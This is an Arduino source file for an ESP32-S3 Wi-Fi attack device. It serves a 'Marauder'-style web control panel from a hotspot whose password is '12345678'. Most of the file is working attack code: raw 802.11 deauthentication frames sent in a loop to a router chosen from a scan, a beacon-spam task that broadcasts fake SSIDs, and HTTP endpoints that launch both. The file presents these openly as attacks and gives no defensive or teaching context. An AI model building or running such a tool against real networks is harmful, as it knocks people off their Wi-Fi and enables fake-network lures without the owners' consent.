#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include <esp_event.h>

// ==========================================
// إعدادات نقطة الاتصال (AP)
// ==========================================
const char* ssid = "MarauderS3";
const char* password = "12345678";

AsyncWebServer server(80);

// متغيرات الحالة
bool isDeauthing = false;
bool isBeaconSpamming = false;
uint8_t target_channel = 1;

// قوائم المسح
struct ApInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
};
ApInfo apList[15];
int apCount = 0;

// ==========================================
// واجهة الويب (HTML/CSS/JS) - تأثيرات الهاكر
// ==========================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ESP32-S3 Marauder</title>
<style>
  :root { 
    --bg: #0a0a0a; 
    --surface: rgba(20, 20, 20, 0.85); 
    --primary: #00ff41; 
    --danger: #ff003c; 
    --text: #e0e0e0; 
    --glow: 0 0 10px rgba(0, 255, 65, 0.5);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
  body { 
    background-color: var(--bg); 
    color: var(--text); 
    padding-bottom: 20px; 
    overflow-x: hidden;
  }
  
  /* Matrix Canvas Background */
  #matrix-canvas {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: -1;
    opacity: 0.3;
  }

  header { 
    background: var(--surface); 
    padding: 20px; 
    text-align: center; 
    border-bottom: 2px solid var(--primary); 
    box-shadow: var(--glow);
    position: relative;
    z-index: 10;
  }
  h1 { 
    font-size: 22px; 
    color: var(--primary); 
    text-transform: uppercase;
    letter-spacing: 2px;
    text-shadow: var(--glow);
    animation: flicker 3s infinite alternate;
  }
  @keyframes flicker {
    0%, 18%, 22%, 25%, 53%, 57%, 100% { text-shadow: 0 0 5px #00ff41, 0 0 10px #00ff41, 0 0 20px #00ff41; }
    20%, 24%, 55% { text-shadow: none; }
  }

  .tabs { 
    display: flex; 
    background: var(--surface); 
    position: relative;
    z-index: 10;
  }
  .tab { 
    flex: 1; 
    padding: 15px; 
    text-align: center; 
    cursor: pointer; 
    border-bottom: 3px solid transparent; 
    font-weight: bold; 
    text-transform: uppercase;
    transition: all 0.3s;
  }
  .tab:hover { background: rgba(0, 255, 65, 0.1); }
  .tab.active { 
    border-bottom-color: var(--primary); 
    color: var(--primary); 
    text-shadow: var(--glow);
  }

  .content { 
    display: none; 
    padding: 15px; 
    animation: fadeIn 0.5s; 
    position: relative;
    z-index: 10;
  }
  .content.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  .card { 
    background: var(--surface); 
    border-radius: 8px; 
    padding: 15px; 
    margin-bottom: 15px; 
    border: 1px solid rgba(0, 255, 65, 0.2);
    box-shadow: inset 0 0 15px rgba(0,0,0,0.8), 0 0 10px rgba(0, 255, 65, 0.1);
    backdrop-filter: blur(5px);
  }
  .card h3 { 
    margin-bottom: 10px; 
    font-size: 16px; 
    color: #aaa; 
    border-bottom: 1px dashed #333; 
    padding-bottom: 5px; 
    text-transform: uppercase;
  }

  button { 
    width: 100%; 
    padding: 12px; 
    margin: 5px 0; 
    background: transparent;
    border-radius: 6px; 
    font-weight: bold; 
    cursor: pointer; 
    font-size: 14px;
    text-transform: uppercase;
    transition: all 0.2s;
    position: relative;
    overflow: hidden;
  }
  .btn-primary { 
    color: var(--primary); 
    border: 1px solid var(--primary); 
  }
  .btn-primary:hover { 
    background: var(--primary); 
    color: #000; 
    box-shadow: 0 0 15px var(--primary);
  }
  .btn-danger { 
    color: var(--danger); 
    border: 1px solid var(--danger); 
  }
  .btn-danger:hover { 
    background: var(--danger); 
    color: #fff; 
    box-shadow: 0 0 15px var(--danger);
  }
  button:active { transform: scale(0.98); }

  input, select { 
    width: 100%; 
    padding: 12px; 
    margin: 5px 0; 
    background: #000; 
    border: 1px solid #333; 
    color: var(--primary); 
    border-radius: 6px; 
    font-family: monospace;
    font-size: 14px;
  }
  input:focus, select:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,65,0.3); }

  #console { 
    background: rgba(0, 0, 0, 0.9); 
    color: var(--primary); 
    padding: 10px; 
    border-radius: 6px; 
    height: 150px; 
    overflow-y: auto; 
    font-family: monospace; 
    font-size: 12px; 
    border: 1px solid #222;
    box-shadow: inset 0 0 10px #000;
  }
  #console::after {
    content: "█";
    animation: blink 1s step-end infinite;
  }
  @keyframes blink { 50% { opacity: 0; } }

</style>
</head><body>

<canvas id="matrix-canvas"></canvas>

<header><h1>⚡ ESP32-S3 Marauder ⚡</h1></header>

<div class="tabs">
  <div class="tab active" onclick="openTab('scan', this)">Recon</div>
  <div class="tab" onclick="openTab('attack', this)">Attacks</div>
  <div class="tab" onclick="openTab('beacon', this)">Beacon</div>
</div>

<div id="scan" class="content active">
  <div class="card">
    <h3>[ Network Discovery ]</h3>
    <button class="btn-primary" onclick="sendCmd('/scanap')">Scan Wi-Fi (AP)</button>
    <button class="btn-primary" onclick="fetch('/list').then(r=>r.text()).then(t=>log(t))">Refresh List</button>
  </div>
  <div class="card">
    <h3>[ Console Output ]</h3>
    <div id="console">System initialized...\nAwaiting commands...</div>
  </div>
</div>

<div id="attack" class="content">
  <div class="card">
    <h3>[ Target Selection ]</h3>
    <select id="targetSelect"><option value="">-- Scan First --</option></select>
    <button class="btn-primary" onclick="loadTargets()">Load Targets</button>
  </div>
  <div class="card">
    <h3>[ Deauthentication ]</h3>
    <button class="btn-primary" onclick="startDeauth('ap')">Deauth AP (Router)</button>
    <button class="btn-danger" style="margin-top: 10px;" onclick="sendCmd('/stop')">HALT ALL ATTACKS</button>
  </div>
</div>

<div id="beacon" class="content">
  <div class="card">
    <h3>[ Beacon Spam ]</h3>
    <input type="text" id="ssid_prefix" placeholder="Enter SSID Prefix (e.g. FreeWiFi)">
    <button class="btn-primary" onclick="startBeacon()">Initiate Spam</button>
    <button class="btn-danger" style="margin-top: 10px;" onclick="sendCmd('/stop')">STOP SPAM</button>
  </div>
</div>

<script>
// ==========================================
// 1. Matrix Rain Effect
// ==========================================
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロゴゾドボポヴッン0123456789ABCDEF';
const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const nums = '0123456789';
const alphabet = katakana + latin + nums;

const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = [];
for (let x = 0; x < columns; x++) { drops[x] = 1; }

function drawMatrix() {
  ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#00ff41';
  ctx.font = fontSize + 'px monospace';

  for (let i = 0; i < drops.length; i++) {
    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      drops[i] = 0;
    }
    drops[i]++;
  }
}
setInterval(drawMatrix, 35);

// ==========================================
// 2. UI Logic
// ==========================================
function openTab(id, el) {
  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  el.classList.add('active');
}

function log(msg) {
  let c = document.getElementById('console');
  c.innerHTML += "\n> " + msg;
  c.scrollTop = c.scrollHeight;
}

function sendCmd(url) {
  log("Sending packet: " + url);
  fetch(url).then(r=>r.text()).then(t=>log(t));
}

function loadTargets() {
  fetch('/list').then(r=>r.text()).then(t=>{
    log("Scanning database...");
    log(t);
    let sel = document.getElementById('targetSelect');
    sel.innerHTML = '<option value="">-- Select Target --</option>';
    let lines = t.split('\n');
    lines.forEach(line => {
      if(line.includes('|')) {
        let parts = line.split('|');
        let opt = document.createElement('option');
        opt.value = parts[1] + '|' + parts[2];
        opt.innerText = parts[1] + ' - ' + parts[3];
        sel.appendChild(opt);
      }
    });
  });
}

function startDeauth(type) {
  let val = document.getElementById('targetSelect').value;
  if(!val) return alert("Target not selected!");
  let parts = val.split('|');
  log(`Initiating Deauth on ${type}...`);
  fetch(`/deauth?type=${type}&mac=${parts[0]}&ch=${parts[1]}`).then(r=>r.text()).then(t=>log(t));
}

function startBeacon() {
  let p = document.getElementById('ssid_prefix').value;
  if(!p) return alert("Enter SSID Prefix!");
  log(`Broadcasting fake SSIDs: ${p}...`);
  fetch(`/beacon?prefix=${p}`).then(r=>r.text()).then(t=>log(t));
}
</script>
</body></html>
)rawliteral";

// ==========================================
// إطارات الهجوم (Raw Frames)
// ==========================================
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 
};

uint8_t beaconPacket[128] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00
};

// ==========================================
// المهام (Tasks)
// ==========================================
void deauthTask(void * parameter) {
  while(isDeauthing) {
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    for(int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 26, false);
    }
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
  vTaskDelete(NULL);
}

void sendBeacon(String name) {
  int len = name.length();
  if (len > 32) len = 32;
  beaconPacket[37] = len;
  memcpy(&beaconPacket[38], name.c_str(), len);
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + len, false);
}

void beaconTask(void * parameter) {
  String* prefix = (String*)parameter;
  int count = 1;
  while(isBeaconSpamming) {
    sendBeacon(*prefix + String(count));
    count++;
    vTaskDelay(20 / portTICK_PERIOD_MS);
  }
  delete prefix;
  vTaskDelete(NULL);
}

// ==========================================
// الإعداد (Setup)
// ==========================================
void setup() {
  Serial.begin(115200);
  
  // إعدادات الراديو الأساسية لشريحة S3
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  
  WiFi.mode(WIFI_AP_STA); 
  WiFi.softAP(ssid, password);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", index_html);
  });

  server.on("/scanap", HTTP_GET, [](AsyncWebServerRequest *request){
    int n = WiFi.scanNetworks();
    apCount = (n > 15) ? 15 : n;
    for (int i = 0; i < apCount; i++) {
      apList[i].ssid = WiFi.SSID(i);
      memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
      apList[i].channel = WiFi.channel(i);
    }
    request->send(200, "text/plain", "Scan Complete. Found: " + String(apCount));
  });

  server.on("/list", HTTP_GET, [](AsyncWebServerRequest *request){
    String out = "";
    for(int i=0; i<apCount; i++) {
      char macStr[18];
      sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
        apList[i].bssid[0],apList[i].bssid[1],apList[i].bssid[2],apList[i].bssid[3],apList[i].bssid[4],apList[i].bssid[5]);
      out += String(i+1) + "|" + macStr + "|" + apList[i].channel + "|" + apList[i].ssid + "\n";
    }
    request->send(200, "text/plain", out);
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("mac") && request->hasParam("ch")) {
      String macStr = request->getParam("mac")->value();
      target_channel = request->getParam("ch")->value().toInt();

      uint8_t target[6];
      sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
             &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);

      memcpy(&deauthPacket[4], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6);
      memcpy(&deauthPacket[10], target, 6);
      memcpy(&deauthPacket[16], target, 6);

      if(!isDeauthing) {
        isDeauthing = true;
        xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 0);
      }
      request->send(200, "text/plain", "Attack Initiated.");
    } else {
      request->send(400, "text/plain", "Error: Missing Params");
    }
  });

  server.on("/beacon", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("prefix")) {
      String* prefix = new String(request->getParam("prefix")->value());
      if(!isBeaconSpamming) {
        isBeaconSpamming = true;
        xTaskCreatePinnedToCore(beaconTask, "beacon", 4096, prefix, 1, NULL, 0);
      }
      request->send(200, "text/plain", "Spam Initiated.");
    }
  });

  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request){
    isBeaconSpamming = false;
    isDeauthing = false;
    request->send(200, "text/plain", "All processes halted.");
  });

  server.begin();
}

void loop() {
  delay(1000);
}
